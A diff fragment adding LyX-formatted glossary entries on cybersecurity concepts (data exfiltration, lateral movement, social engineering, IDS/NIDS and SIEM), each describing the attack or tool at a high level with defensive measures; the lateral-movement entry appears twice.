+ repeated small outbound requests,
+ or data compressed/encrypted before leaving.
+ Useful indicators include spikes in outbound bandwidth at odd hours,
+ new processes making network connections,
+ atypical use of admin tools,
+ and unexpected access to sensitive repositories.
+ Preventing and limiting impact requires defense-in-depth:
+ enforce least privilege and strict access controls,
+ monitor and log data access,
+ apply DLP (data loss prevention) rules and network egress filtering,
+ segment networks and mark sensitive data,
+ and use strong encryption and endpoint protection.
+ Regular audits,
+ anomaly detection,
+ rapid incident response,
+ and employee training reduce both the chance of successful exfiltration and the damage if it occurs.
+\end_layout
+
+\begin_layout Enumerate
+
+\color brown
+Lateral movement
+\color inherit
+ is a technique used by attackers after gaining an initial foothold in a network to move deeper into the system and access additional machines,
+ data,
+ or privileged accounts.
+ Instead of attacking from the outside again,
+ the intruder uses internal connections and trust relationships to expand control step by step.
+ The goal is usually to reach valuable targets such as domain controllers,
+ file servers,
+ or databases while remaining undetected.
+ Common methods of lateral movement include using stolen credentials,
+ exploiting weak administrative shares (like SMB or RDP),
+ abusing remote execution tools such as PsExec or PowerShell,
+ and reusing cached sessions or tokens.
+ Attackers may also exploit unpatched internal services or misconfigurations to escalate privileges and move across systems without triggering alarms.
+ Defending against lateral movement requires strong network segmentation,
+ limiting user privileges,
+ enforcing multi-factor authentication,
+ and monitoring for abnormal login activity between hosts.
+ Regular patching,
+ disabling unnecessary remote services,
+ and collecting detailed logs for tools like PowerShell or RDP are also essential.
+ Early detection of lateral movement is key to stopping a breach before attackers reach critical assets.
+\end_layout
+
+\begin_layout Enumerate
+
+\color brown
+Lateral movement
+\color inherit
+ is a technique used by attackers after gaining an initial foothold in a network to move deeper into the system and access additional machines,
+ data,
+ or privileged accounts.
+ Instead of attacking from the outside again,
+ the intruder uses internal connections and trust relationships to expand control step by step.
+ The goal is usually to reach valuable targets such as domain controllers,
+ file servers,
+ or databases while remaining undetected.
+ Common methods of lateral movement include using stolen credentials,
+ exploiting weak administrative shares (like SMB or RDP),
+ abusing remote execution tools such as PsExec or PowerShell,
+ and reusing cached sessions or tokens.
+ Attackers may also exploit unpatched internal services or misconfigurations to escalate privileges and move across systems without triggering alarms.
+ Defending against lateral movement requires strong network segmentation,
+ limiting user privileges,
+ enforcing multi-factor authentication,
+ and monitoring for abnormal login activity between hosts.
+ Regular patching,
+ disabling unnecessary remote services,
+ and collecting detailed logs for tools like PowerShell or RDP are also essential.
+ Early detection of lateral movement is key to stopping a breach before attackers reach critical assets.
+\end_layout
+
+\begin_layout Enumerate
+
+\color brown
+Social engineering
+\color inherit
+ is a manipulation technique that targets human behavior instead of technical systems.
+ Attackers use deception,
+ persuasion,
+ or psychological pressure to trick people into revealing confidential information,
+ clicking malicious links,
+ or performing actions that compromise security.
+ Typical examples include phishing emails,
+ fake technical support calls,
+ or impersonation of trusted authorities.
+ Unlike technical hacking,
+ social engineering does not rely on code exploits or vulnerabilities in software but rather on exploiting human trust,
+ fear,
+ or curiosity.
+ Because of this,
+ 
+\color violet
+in the hacker community,
+ social engineers are often viewed as the “lowest caste” of hackers many professionals despise and look down on them,
+ seeing their methods as lacking technical skill and relying only on manipulation.
+
+\color inherit
+ In that sense,
+ social engineering is sometimes described as “hacking people instead of systems.” Defending against social engineering requires continuous awareness training,
+ strict verification of requests,
+ multi-factor authentication,
+ and a strong security culture where users are encouraged to question unusual or urgent demands.
+ While technically simple,
+ social engineering remains one of the most effective attack methods precisely because it exploits the weakest link human nature.
+ 
+\end_layout
+
+\begin_layout Enumerate
+
+\color brown
+IDS stands for Intrusion Detection System
+\color inherit
+,
+ a security mechanism designed to monitor network or system activity for malicious behavior or policy violations.
+ It works like an alarm system it doesn’t block attacks directly but detects suspicious patterns and alerts administrators so they can respond.
+ IDS can analyze logs,
+ monitor network traffic,
+ and look for known attack signatures or abnormal activity that might indicate a compromise.
+ A Network Intrusion Detection System (NIDS) is a specific type of IDS that focuses on monitoring network traffic in real time.
+ It inspects packets as they pass through routers,
+ firewalls,
+ or switches,
+ searching for known exploits,
+ unusual port scans,
+ or suspicious data flows.
+ NIDS tools,
+ such as Snort,
+ Suricata,
+ or Zeek (Bro),
+ are commonly used to detect early stages of an attack,
+ like reconnaissance or lateral movement.
+ Unlike firewalls,
+ which block or allow traffic based on rules,
+ IDS and NIDS are passive detection systems they observe and report.
+ Some systems,
+ known as IPS (Intrusion Prevention Systems),
+ go further and automatically block malicious activity.
+ In practice,
+ combining NIDS with proper logging,
+ correlation tools,
+ and human analysis helps organizations detect attacks early and understand ongoing security incidents before serious damage occurs.
+\end_layout
+
+\begin_layout Enumerate
+
+\color brown
+SIEM,
+ or Security Information and Event Management,
+
+\color inherit
+ is a centralized system that collects,
+ stores,
+ and analyzes security-related logs and events from across an organization’s IT infrastructure.
+ It combines two core functions Security Information Management (SIM),
+ which deals with long-term storage and analysis of historical log data,
+ and Security Event Management (SEM),
+ which focuses on real-time monitoring,
+ correlation,
+ and alerting.
+ A SIEM platform gathers data from firewalls,
+ servers,
+ IDS/IPS systems,
+ antivirus tools,
+ applications,
+ and even cloud services,
+ then correlates these events to identify suspicious or abnormal activity.
+ For example,
+ if multiple failed logins are followed by a successful one from a new location,
+ the SIEM can generate an alert for possible credential compromise.
+ Modern SIEM solutions,
+ such as Splunk,
+ IBM QRadar,
+ Elastic SIEM,
+ or Azure Sentinel,
+ often use advanced analytics,
+ machine learning,
+ and threat intelligence feeds to detect complex attack patterns.
+ They also help organizations meet compliance requirements by maintaining centralized audit logs and generating security reports.
+ In essence,
+ SIEM serves as the “security brain” of an organization providing visibility,
+ detection,
+ and response coordination across diverse systems to help security teams react quickly and effectively to incidents.
+\end_layout
+
+\begin_layout Standard
+\begin_inset Separator plain
+\end_inset
+
+
 \end_layout
 
 \end_body
